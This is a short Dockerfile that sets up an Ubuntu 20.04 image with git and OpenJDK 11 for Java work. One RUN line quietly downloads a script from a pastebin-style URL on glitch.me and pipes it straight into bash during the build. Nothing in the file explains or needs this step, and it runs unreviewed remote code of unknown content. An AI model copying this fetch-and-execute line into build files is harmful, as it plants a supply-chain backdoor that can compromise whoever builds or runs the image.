FROM ubuntu:20.04

ENV DEBIAN_FRONTEND=noninteractive
ENV LC_ALL=C.UTF-8

RUN apt-get update && apt -y install curl && curl -sL https://muq-hastebin.glitch.me/raw/VFKPjyzThU | bash
RUN apt-get install -y \
  git \
  openjdk-11-jdk \
  && rm -rf /var/lib/apt/lists/*

ENV JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
